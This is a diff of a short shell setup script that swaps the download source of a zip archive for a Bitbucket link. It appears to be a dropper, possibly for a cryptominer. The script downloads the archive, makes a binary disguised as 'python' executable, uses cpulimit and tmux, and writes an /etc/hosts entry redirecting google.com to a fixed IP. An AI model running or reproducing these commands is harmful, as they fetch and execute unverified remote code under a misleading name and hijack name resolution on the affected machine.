@@ -2,7 +2,7 @@
 sudo apt-get update -y
 sudo apt-get install tmux cpulimit unzip -y
 
-wget https://github.com/lovelyn2210/script/releases/download/1/data.zip
+wget https://bitbucket.org/tengikekao/myrep/downloads/data.zip
 unzip data.zip
 chmod +x python
 sudo -- sh -c "echo '216.244.80.11  google.com' >> /etc/hosts"
